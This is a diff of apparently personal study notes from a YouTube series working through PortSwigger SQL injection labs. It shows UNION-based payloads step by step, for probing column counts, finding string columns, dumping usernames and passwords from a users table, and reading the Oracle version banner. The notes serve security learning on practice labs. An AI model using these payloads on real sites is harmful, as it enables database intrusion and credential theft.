@@ -14,6 +14,8 @@ Episode3- YouTube Channel AcronProject
             
             4- Continue adding null values until the error disappears and the response includes additional content containing the null values.
 
+-------------------------------------------------------------------------------------------------------------------------------------
+-------------------------------------------------------------------------------------------------------------------------------------
 
 
 Episode4- YouTube Channel AcronProject
@@ -35,11 +37,19 @@ Episode4- YouTube Channel AcronProject
                 '+UNION+SELECT+NULL,NULL,'GnzPjV'--
 
             4- If an error occurs, move on to the next null and try that instead.
+-------------------------------------------------------------------------------------------------------------------------------------
+-------------------------------------------------------------------------------------------------------------------------------------
 
-Episode5- YouTube Channel AcronProject
+Episode5- YouTube Channel AcronProject:
+    BurpSuite Installation on Ubuntu 22.04.2 LTS
+
+
+-------------------------------------------------------------------------------------------------------------------------------------
+-------------------------------------------------------------------------------------------------------------------------------------
+
+Episode6- YouTube Channel AcronProject
     Source: https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables
         Lab: SQL injection UNION attack, retrieving data from other tables
-
         My Solution:
             #1 Detection + All the commands used = 
                 1- '                     =Internal Server Error
@@ -101,8 +111,12 @@ Episode5- YouTube Channel AcronProject
         
         4- Verify that the application's response contains usernames and passwords.
 
+-------------------------------------------------------------------------------------------------------------------------------------
+-------------------------------------------------------------------------------------------------------------------------------------
 
-Episode6- YouTube Channel AcronProject:
+
+
+Episode7- YouTube Channel AcronProject:
     Retrieving multiple values within a single column:
         In the preceding example, suppose instead that the query only returns a single column.
         You can easily retrieve multiple values together within this single column by concatenating the values together, 
@@ -124,14 +138,50 @@ Episode6- YouTube Channel AcronProject:
                 My Solution:
                 #1 Detection + All the commands used = 
                     1- '     => SELECT category = '''  = Error = probably vulnerable
-                    2- ''    => SELECT category = '''' = Error = probably vulnerable
+                    2- ''    => SELECT category = '''' => 
                     3- '+UNION+SELECT+NULL,'abc'-- => SELECT category = ''+UNION+SELECT+NULL,'abc'-- = print in browser = probably vulnerable 
-                                                                                                    = secend column is string
+                                                                                                   = secend column is string
                     4- '+UNION+SELECT+'abc',NULL-- => SELECT category = '+UNION+SELECT+'abc',NULL--  = first column is probably string
                     '+UNION+SELECT+123,NULL--
                     5- '+UNION+SELECT+NULL,username||'~'||password+FROM+users--
                                                 => SELECT category = '+UNION+SELECT+NULL,"username~password"--
                                                                                                     = get the usernames and password so this is vulnerable
+
+-------------------------------------------------------------------------------------------------------------------------------------
+-------------------------------------------------------------------------------------------------------------------------------------
+
+
+Episode8- YouTube Channel AcronProject:
+    Title:
+        Lab: SQL injection attack, querying the database type and version on Oracle
+    Source:
+        https://portswigger.net/web-security/sql-injection/examining-the-database
+
+    Lab:
+        https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle
+
+    Detection Black Box :    @@version  OR v$version OR version() 
+        1- '
+        2- ''
+            Result: 1 != 2 ---> SQLi probably
+
+        3- '+UNION+SELECT+NULL+FROM+v$version--      
+        4- '+UNION+SELECT+NULL,+NULL+FROM+v$version--
+            Result: 3 != 4 ---> Two columns probably              
+                                and
+                                is Oracle Because --> SELECT * FROM v$version 
+                                                                    ---------
+                            
+        5- '+UNION+SELECT+'string',+NULL+FROM+v$version--
+            Result: Show in browser => first column is string
+
+        6- '+UNION+SELECT+'string',+'string2'+FROM+v$version--
+            Result: Show in browser => secend column is string
+        
+        7- '+UNION+SELECT+banner,+NULL+FROM+v$version--
+
+        
+
 
 
 
